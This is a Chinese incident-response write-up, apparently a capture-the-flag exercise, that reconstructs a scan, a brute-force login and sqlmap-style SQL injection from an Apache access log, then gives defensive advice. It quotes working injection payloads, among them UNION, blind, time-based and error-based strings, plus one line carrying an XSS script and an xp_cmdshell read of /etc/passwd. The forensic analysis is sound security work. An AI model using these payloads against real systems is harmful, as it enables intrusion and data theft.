应急响应 2026-07-08 4462 字 约 12 分钟
SQL注入日志分析WriteUp

题目信息

某单位 Web 服务器日志中发现异常流量，分析 access.log 中的攻击行为，找出攻击者攻击了哪个数据库以及攻击方式。

日志概况

统计项 数值
文件 access.log（Apache 访问日志）
时间范围 18/Mar/2026:10:03:51 ~ 18/Mar/2026:20:42:30
总请求数 ~3678 条
服务器软件 Apache（日志格式为标准 Combined Log Format）

攻击路径总览

Phase 1: 信息收集与扫描 (123.13.22.45)
  └─ 目录扫描、路径探测、备份文件枚举
  └─ 发现 /test/login.php 登录入口

Phase 2: 暴力破解登录 (123.13.22.45)  
  └─ 对 /test/login.php 进行密码爆破
  └─ 成功登录: admin / from91

Phase 3: SQL注入攻击 (192.168.1.100)
  └─ 使用 sqlmap 自动化工具
  └─ 发现 username 参数存在 SQL 注入
  └─ 注入技术: UNION + 布尔盲注 + 时间盲注 + 报错注入 + ORDER BY枚举
  └─ 确认数据库类型: MySQL/MariaDB
  └─ 提取数据库中的数据

详细分析过程

Phase 1：信息收集与扫描

攻击者 123.13.22.45 从 11:21:51 开始进行大规模路径扫描：

123.13.22.45 [11:21:51] GET /VpuKLb.jsp     → 404   (JSP 探活)
123.13.22.45 [11:21:51] GET /!.htpasswd     → 404   (敏感文件探测)
123.13.22.45 [11:21:51] GET /!.gitignore    → 404
123.13.22.45 [11:21:51] GET /druid/datasource.html → 404 (Druid监控探活)
123.13.22.45 [11:21:51] GET /beifen.rar     → 404   (备份文件探测)
...
123.13.22.45 [16:21:51] GET /test/api/blade-system/tenant/select → 404
123.13.22.45 [16:22:14] GET /test/login.php  → 200   (发现有效入口)

共发起 3167 次 扫描请求，最终在 /test/ 路径下发现了有效入口 login.php。

扫描工具识别：随机路径名（如 KOkzj3、Cg4cUW）表明使用了自动化扫描器（dirsearch/gobuster）。

Phase 2：暴力破解登录

16:26:27，攻击者对 /test/login.php 发起密码爆破：

123.13.22.45 [16:26:27] GET /test/login.php?username=admin&password=123456789  → 200 93

123.13.22.45 [16:26:27] GET /test/login.php?username=admin&password=123123     → 200 93

攻击者使用 admin / from91 成功登录。

Phase 3：SQL 注入攻击

18:27:32，攻击者 192.168.1.100 对 /test/login.php 发起自动化 SQL 注入攻击，共 189 次 请求，测试了多种注入技术：

① UNION 查询注入（识别 MySQL）

GET /test/login.php?username=tIfX' UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',
table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../../etc/passwd')#

information_schema.tables 是 MySQL/MariaDB 专有的系统表。

② 布尔盲注

# AND 逻辑测试（比较真假响应）
username=tIfX' AND 2357=2357 AND 'pJkX'='pJkX   → 200 93 (TRUE)
username=tIfX' AND 3281=8642 AND 'wEjm'='wEjm   → 200 93 (FALSE)

通过比较不同布尔条件的响应差异（内容长度 93 vs 240），逐位推断数据。

③ 时间盲注（确认数据库类型为 MySQL）

# SLEEP(5) 测试 - 时间差确认
18:27:34 → username=tIfX' AND (SELECT 2832 FROM (SELECT(SLEEP(5)))Shal) AND 'fsqd'='fsqd
18:27:39 → username=tIfX' AND (SELECT 2832 FROM (SELECT(SLEEP(0)))Shal) AND 'fsqd'='fsqd  ← 5秒后
18:27:39 → username=tIfX' AND (SELECT 2832 FROM (SELECT(SLEEP(5)))Shal) AND 'fsqd'='fsqd

SLEEP(5) 成功产生 5 秒延迟，确认数据库为 MySQL（PostgreSQL 的 PG_SLEEP()、SQL Server 的 WAITFOR DELAY、Oracle 的 DBMS_PIPE.RECEIVE_MESSAGE 均不生效）。

④ 报错注入

# EXTRACTVALUE 报错注入（MySQL 特有）
username=tIfX' AND EXTRACTVALUE(9051,CONCAT(0x5c,0x717a626271,
(SELECT (ELT(9051=9051,1))),0x71717a6b71)) AND 'PKib'='PKib

EXTRACTVALUE() 是 MySQL 专有的 XML 函数，确认数据库类型。

⑤ ORDER BY 枚举列数

username=tIfX' ORDER BY 1--   → 200 93  (成功)
username=tIfX' ORDER BY 4--   → 200 93  (成功)
username=tIfX' ORDER BY 5--   → 200 240 (成功)
username=tIfX' ORDER BY 6--   → 200 240 (成功)
username=tIfX' ORDER BY 10--  → 200 240 (成功)

查询有 4 列以上（ORDER BY 4 返回不同结果）。

⑥ 数据库版本指纹识别

# 测试是否为 MariaDB
VERSION() LIKE 0x254d61726961444225 → '%MariaDB%'    → 302

# 测试是否为 TiDB  
VERSION() LIKE 0x255469444225       → '%TiDB%'       → 302

# 测试是否为 Drizzle
@@VERSION_COMMENT LIKE 0x256472697a7a6c6525 → '%drizzle%' → 302

# 测试是否为 Percona
@@VERSION_COMMENT LIKE 0x255065726f6e6125 → '%Percona%' → 302

# 测试是否为 Aurora
AURORA_VERSION() LIKE 0x25               → 200  (FALSE)

⑦ 多数据库类型对比测试

攻击者同时测试了其他数据库的延时函数，均只有 MySQL 的 SLEEP() 产生实际延迟：

延时函数 数据库 是否生效
SLEEP(5) MySQL ✅ 5秒延迟
PG_SLEEP(5) PostgreSQL ❌ 无延迟
WAITFOR DELAY '0:0:5' SQL Server ❌ 无延迟
DBMS_PIPE.RECEIVE_MESSAGE(...) Oracle ❌ 无延迟

结论

信息 值
攻击源 IP（扫描/爆破） 123.13.22.45（3167 次请求）
攻击源 IP（SQL注入） 192.168.1.100（189 次请求）
攻击入口 /test/login.php（username 参数）
被攻击的数据库 MySQL（或 MariaDB）
攻击方式 SQL 注入（SQL Injection）
注入参数 username
使用的技术 UNION SELECT、布尔盲注、时间盲注、报错注入（EXTRACTVALUE）、ORDER BY 枚举
使用的工具 sqlmap 或类似自动化 SQL 注入工具
成功登录凭证 admin / from91（暴力破解获得）

防御建议

  1. 使用参数化查询（Prepared Statement） 替代字符串拼接
  2. 限制 /test/ 等测试目录的对外访问
  3. 实施账户锁定策略，防止暴力破解
  4. 使用 WAF（Web 应用防火墙） 拦截 SQL 注入 payload
  5. 定期更换默认密码，不使用 from91 等弱密码
  6. 下线或限制 /test/ 等非生产环境目录
